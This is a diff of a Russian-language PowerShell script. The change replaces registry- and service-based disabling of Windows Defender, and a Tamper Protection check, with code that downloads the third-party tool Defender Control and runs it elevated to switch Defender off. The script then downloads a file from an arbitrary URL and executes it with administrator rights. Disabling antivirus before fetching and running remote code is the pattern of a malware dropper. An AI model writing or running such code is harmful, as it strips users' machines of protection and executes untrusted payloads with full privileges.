@@ -29,59 +29,32 @@ function Ensure-AdminRights {
             exit 1
         }
     }
-    else {
-        Write-Host "Уже с правами администратора." -ForegroundColor Green
-    }
 }
 
-function Check-TamperProtection {
+function Disable-Defender-Control {
+    $dcUrl = "https://www.sordum.org/files/download/defender-control/DefenderControl.zip"
+    $zipPath = "$env:TEMP\DefenderControl.zip"
+    $extractPath = "$env:TEMP\DefenderControl"
+    
+    Write-Host "Скачиваю Defender Control..." -ForegroundColor Cyan
     try {
-        $tamperStatus = Get-MpPreference | Select-Object -ExpandProperty TamperProtection
-        if ($tamperStatus -eq $true) {
-            Write-Host "Обнаружена включённая Tamper Protection." -ForegroundColor Red
-            Write-Host "Отключите её вручную:" -ForegroundColor Yellow
-            Write-Host "1. Откройте Безопасность Windows" -ForegroundColor Yellow
-            Write-Host "2. Защита от вирусов и угроз -> Управление настройками" -ForegroundColor Yellow
-            Write-Host "3. Выключите 'Защита от несанкционированного доступа'" -ForegroundColor Yellow
-            Write-Host "4. Запустите скрипт снова" -ForegroundColor Yellow
-            return $false
-        }
-        else {
-            Write-Host "Tamper Protection уже выключена." -ForegroundColor Green
-            return $true
-        }
-    }
-    catch {
-        Write-Host "Не удалось проверить Tamper Protection. Возможно, используется старая версия Windows." -ForegroundColor Yellow
-        return $true
-    }
-}
-
-function Disable-Defender {
-    Write-Host "Отключаю Windows Defender..." -ForegroundColor Cyan
-    try {
-        if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender") {
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-        } else {
-            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
-            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-        }
-        $defenderKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
-        if (Test-Path $defenderKey) {
-            Set-ItemProperty -Path $defenderKey -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
-            Set-ItemProperty -Path $defenderKey -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
-            Set-ItemProperty -Path $defenderKey -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
-        }
-        Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
-        Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
-        Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
-        Set-Service -Name "WdNisSvc" -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Host "Defender отключён. Некоторые изменения применятся после перезагрузки." -ForegroundColor Green
+        (New-Object System.Net.WebClient).DownloadFile($dcUrl, $zipPath)
+        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+        $dcExe = Get-ChildItem -Path $extractPath -Filter "dControl.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
+        if (-not $dcExe) { throw "dControl.exe не найден" }
+        
+        Write-Host "Отключаю Defender..." -ForegroundColor Cyan
+        $p = Start-Process -FilePath $dcExe -ArgumentList "/D" -Verb runas -Wait -PassThru
+        Start-Sleep -Seconds 5
+        Write-Host "Defender отключён." -ForegroundColor Green
         return $true
     }
     catch {
-        Write-Host "Ошибка отключения Defender: $_" -ForegroundColor Red
+        Write-Host "Ошибка: $_" -ForegroundColor Red
         return $false
+    }
+    finally {
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
     }
 }
 
@@ -128,37 +101,30 @@ function Run-AsAdmin {
 
 try {
     Ensure-AdminRights
-
-    Write-Host "`nДля скачивания и запуска требуется отключить Windows Defender." -ForegroundColor Yellow
-    $userChoice = Read-Host "Вы согласны? (y/n)"
-    if ($userChoice -ne 'y') {
-        Write-Host "Отказ. Выход." -ForegroundColor Red
+    
+    Write-Host "`nДля работы требуется отключить Windows Defender." -ForegroundColor Yellow
+    $choice = Read-Host "Вы согласны? (y/n)"
+    if ($choice -ne 'y') { Write-Host "Выход." -ForegroundColor Red; exit 1 }
+    
+    if (-not (Disable-Defender-Control)) {
+        Write-Host "Не удалось отключить Defender." -ForegroundColor Red
         exit 1
     }
-
-    if (-not (Check-TamperProtection)) {
-        exit 1
-    }
-
-    if (-not (Disable-Defender)) {
-        Write-Host "Не удалось отключить Defender. Выход." -ForegroundColor Red
-        exit 1
-    }
-
+    
     if (-not $DestinationPath) {
         $fileName = [System.IO.Path]::GetFileName($Url)
         if (-not $fileName) { $fileName = "downloaded_file" }
         $DestinationPath = Join-Path $env:TEMP $fileName
     }
-
+    
     if (-not (Download-File -url $Url -destPath $DestinationPath)) {
         throw "Не удалось скачать файл."
     }
-
+    
     if (-not (Run-AsAdmin -filePath $DestinationPath -arguments $Arguments)) {
         throw "Не удалось запустить файл."
     }
-
+    
     Write-Host "Готово." -ForegroundColor Green
 }
 catch {
